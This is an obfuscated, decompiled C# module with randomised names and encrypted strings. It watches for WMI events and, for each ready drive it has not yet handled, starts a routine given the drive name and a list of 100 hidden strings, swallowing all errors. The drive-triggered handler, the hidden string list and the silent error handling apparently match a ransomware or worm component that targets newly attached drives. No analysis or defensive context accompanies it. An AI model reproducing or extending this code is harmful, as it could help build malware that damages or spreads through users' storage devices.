using System;
using System.IO;
using System.Management;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace drXPuaQNZPOSPCS;

internal static class eqqULjqQvKNU
{
	private sealed class zHXeqSZCqEqwBTy
	{
		public DriveInfo WotolCHdQZOTLuv;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWatcherOnEventArrived_003Eb__0()
		{
			OBRXLDkWsVk.EobBUtdrrLs(WotolCHdQZOTLuv.Name, new string[100]
			{
				getString_0(107395911),
				getString_0(107395906),
				getString_0(107395869),
				getString_0(107395860),
				getString_0(107395855),
				getString_0(107395882),
				getString_0(107395877),
				getString_0(107395872),
				getString_0(107395835),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107395852),
				getString_0(107395843),
				getString_0(107395838),
				getString_0(107395797),
				getString_0(107395792),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395809),
				getString_0(107395772),
				getString_0(107395763),
				getString_0(107395758),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395775),
				getString_0(107396250),
				getString_0(107396245),
				getString_0(107396240),
				getString_0(107396267),
				getString_0(107396262),
				getString_0(107396257),
				getString_0(107396220),
				getString_0(107396215),
				getString_0(107396210),
				getString_0(107396233),
				getString_0(107396228),
				getString_0(107396223),
				getString_0(107396186),
				getString_0(107395877),
				getString_0(107396181),
				getString_0(107395835),
				getString_0(107396204),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107396147),
				getString_0(107396142),
				getString_0(107396169),
				getString_0(107396164),
				getString_0(107396159),
				getString_0(107396122),
				getString_0(107396117),
				getString_0(107396112),
				getString_0(107396139),
				getString_0(107396134),
				getString_0(107396129),
				getString_0(107396092),
				getString_0(107396083),
				getString_0(107396078),
				getString_0(107396101),
				getString_0(107396056),
				getString_0(107396181),
				getString_0(107396075),
				getString_0(107396066),
				getString_0(107396025),
				getString_0(107396016),
				getString_0(107396039),
				getString_0(107396030),
				getString_0(107395481),
				getString_0(107395472),
				getString_0(107395495),
				getString_0(107395486),
				getString_0(107395449),
				getString_0(107395444),
				getString_0(107395439),
				getString_0(107395466),
				getString_0(107395461),
				getString_0(107395456),
				getString_0(107395415),
				getString_0(107395410),
				getString_0(107395437),
				getString_0(107395432),
				getString_0(107395427),
				getString_0(107395422),
				getString_0(107395381),
				getString_0(107395404),
				getString_0(107395399),
				getString_0(107396215),
				getString_0(107395394),
				getString_0(107395357),
				getString_0(107395352),
				getString_0(107395347),
				getString_0(107395342),
				getString_0(107395365),
				getString_0(107395360),
				getString_0(107395323),
				getString_0(107395314),
				getString_0(107395341),
				getString_0(107395336)
			}, getString_0(107395331), new string[0], OBRXLDkWsVk.yIgCFYujnVKnghS);
		}

		static zHXeqSZCqEqwBTy()
		{
			Strings.CreateGetStringDelegate(typeof(zHXeqSZCqEqwBTy));
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public static void QYmXYxRPcsCNkL()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			ManagementEventWatcher val = new ManagementEventWatcher();
			WqlEventQuery query = new WqlEventQuery(getString_0(107400074));
			val.add_EventArrived(new EventArrivedEventHandler(xPbRPqzHSfEolIr));
			val.set_Query((EventQuery)(object)query);
			val.Start();
			val.WaitForNextEvent();
		}
		catch
		{
		}
	}

	private static void xPbRPqzHSfEolIr(object sender, EventArrivedEventArgs e)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length <= 0)
			{
				return;
			}
			DriveInfo[] array = drives;
			for (int i = 0; i < array.Length; i++)
			{
				zHXeqSZCqEqwBTy CS_0024_003C_003E8__locals0 = new zHXeqSZCqEqwBTy();
				CS_0024_003C_003E8__locals0.WotolCHdQZOTLuv = array[i];
				if (!CS_0024_003C_003E8__locals0.WotolCHdQZOTLuv.IsReady || OBRXLDkWsVk.wHJSEylKjdkFOLFWi.Contains(CS_0024_003C_003E8__locals0.WotolCHdQZOTLuv.Name))
				{
					continue;
				}
				try
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						OBRXLDkWsVk.EobBUtdrrLs(CS_0024_003C_003E8__locals0.WotolCHdQZOTLuv.Name, new string[100]
						{
							zHXeqSZCqEqwBTy.getString_0(107395911),
							zHXeqSZCqEqwBTy.getString_0(107395906),
							zHXeqSZCqEqwBTy.getString_0(107395869),
							zHXeqSZCqEqwBTy.getString_0(107395860),
							zHXeqSZCqEqwBTy.getString_0(107395855),
							zHXeqSZCqEqwBTy.getString_0(107395882),
							zHXeqSZCqEqwBTy.getString_0(107395877),
							zHXeqSZCqEqwBTy.getString_0(107395872),
							zHXeqSZCqEqwBTy.getString_0(107395835),
							zHXeqSZCqEqwBTy.getString_0(107395830),
							zHXeqSZCqEqwBTy.getString_0(107395825),
							zHXeqSZCqEqwBTy.getString_0(107395852),
							zHXeqSZCqEqwBTy.getString_0(107395843),
							zHXeqSZCqEqwBTy.getString_0(107395838),
							zHXeqSZCqEqwBTy.getString_0(107395797),
							zHXeqSZCqEqwBTy.getString_0(107395792),
							zHXeqSZCqEqwBTy.getString_0(107395819),
							zHXeqSZCqEqwBTy.getString_0(107395814),
							zHXeqSZCqEqwBTy.getString_0(107395809),
							zHXeqSZCqEqwBTy.getString_0(107395772),
							zHXeqSZCqEqwBTy.getString_0(107395763),
							zHXeqSZCqEqwBTy.getString_0(107395758),
							zHXeqSZCqEqwBTy.getString_0(107395785),
							zHXeqSZCqEqwBTy.getString_0(107395780),
							zHXeqSZCqEqwBTy.getString_0(107395775),
							zHXeqSZCqEqwBTy.getString_0(107396250),
							zHXeqSZCqEqwBTy.getString_0(107396245),
							zHXeqSZCqEqwBTy.getString_0(107396240),
							zHXeqSZCqEqwBTy.getString_0(107396267),
							zHXeqSZCqEqwBTy.getString_0(107396262),
							zHXeqSZCqEqwBTy.getString_0(107396257),
							zHXeqSZCqEqwBTy.getString_0(107396220),
							zHXeqSZCqEqwBTy.getString_0(107396215),
							zHXeqSZCqEqwBTy.getString_0(107396210),
							zHXeqSZCqEqwBTy.getString_0(107396233),
							zHXeqSZCqEqwBTy.getString_0(107396228),
							zHXeqSZCqEqwBTy.getString_0(107396223),
							zHXeqSZCqEqwBTy.getString_0(107396186),
							zHXeqSZCqEqwBTy.getString_0(107395877),
							zHXeqSZCqEqwBTy.getString_0(107396181),
							zHXeqSZCqEqwBTy.getString_0(107395835),
							zHXeqSZCqEqwBTy.getString_0(107396204),
							zHXeqSZCqEqwBTy.getString_0(107396199),
							zHXeqSZCqEqwBTy.getString_0(107396194),
							zHXeqSZCqEqwBTy.getString_0(107396157),
							zHXeqSZCqEqwBTy.getString_0(107396152),
							zHXeqSZCqEqwBTy.getString_0(107396147),
							zHXeqSZCqEqwBTy.getString_0(107396142),
							zHXeqSZCqEqwBTy.getString_0(107396169),
							zHXeqSZCqEqwBTy.getString_0(107396164),
							zHXeqSZCqEqwBTy.getString_0(107396159),
							zHXeqSZCqEqwBTy.getString_0(107396122),
							zHXeqSZCqEqwBTy.getString_0(107396117),
							zHXeqSZCqEqwBTy.getString_0(107396112),
							zHXeqSZCqEqwBTy.getString_0(107396139),
							zHXeqSZCqEqwBTy.getString_0(107396134),
							zHXeqSZCqEqwBTy.getString_0(107396129),
							zHXeqSZCqEqwBTy.getString_0(107396092),
							zHXeqSZCqEqwBTy.getString_0(107396083),
							zHXeqSZCqEqwBTy.getString_0(107396078),
							zHXeqSZCqEqwBTy.getString_0(107396101),
							zHXeqSZCqEqwBTy.getString_0(107396056),
							zHXeqSZCqEqwBTy.getString_0(107396181),
							zHXeqSZCqEqwBTy.getString_0(107396075),
							zHXeqSZCqEqwBTy.getString_0(107396066),
							zHXeqSZCqEqwBTy.getString_0(107396025),
							zHXeqSZCqEqwBTy.getString_0(107396016),
							zHXeqSZCqEqwBTy.getString_0(107396039),
							zHXeqSZCqEqwBTy.getString_0(107396030),
							zHXeqSZCqEqwBTy.getString_0(107395481),
							zHXeqSZCqEqwBTy.getString_0(107395472),
							zHXeqSZCqEqwBTy.getString_0(107395495),
							zHXeqSZCqEqwBTy.getString_0(107395486),
							zHXeqSZCqEqwBTy.getString_0(107395449),
							zHXeqSZCqEqwBTy.getString_0(107395444),
							zHXeqSZCqEqwBTy.getString_0(107395439),
							zHXeqSZCqEqwBTy.getString_0(107395466),
							zHXeqSZCqEqwBTy.getString_0(107395461),
							zHXeqSZCqEqwBTy.getString_0(107395456),
							zHXeqSZCqEqwBTy.getString_0(107395415),
							zHXeqSZCqEqwBTy.getString_0(107395410),
							zHXeqSZCqEqwBTy.getString_0(107395437),
							zHXeqSZCqEqwBTy.getString_0(107395432),
							zHXeqSZCqEqwBTy.getString_0(107395427),
							zHXeqSZCqEqwBTy.getString_0(107395422),
							zHXeqSZCqEqwBTy.getString_0(107395381),
							zHXeqSZCqEqwBTy.getString_0(107395404),
							zHXeqSZCqEqwBTy.getString_0(107395399),
							zHXeqSZCqEqwBTy.getString_0(107396215),
							zHXeqSZCqEqwBTy.getString_0(107395394),
							zHXeqSZCqEqwBTy.getString_0(107395357),
							zHXeqSZCqEqwBTy.getString_0(107395352),
							zHXeqSZCqEqwBTy.getString_0(107395347),
							zHXeqSZCqEqwBTy.getString_0(107395342),
							zHXeqSZCqEqwBTy.getString_0(107395365),
							zHXeqSZCqEqwBTy.getString_0(107395360),
							zHXeqSZCqEqwBTy.getString_0(107395323),
							zHXeqSZCqEqwBTy.getString_0(107395314),
							zHXeqSZCqEqwBTy.getString_0(107395341),
							zHXeqSZCqEqwBTy.getString_0(107395336)
						}, zHXeqSZCqEqwBTy.getString_0(107395331), new string[0], OBRXLDkWsVk.yIgCFYujnVKnghS);
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = false;
					thread.Start();
					thread.Join();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	static eqqULjqQvKNU()
	{
		Strings.CreateGetStringDelegate(typeof(eqqULjqQvKNU));
	}
}
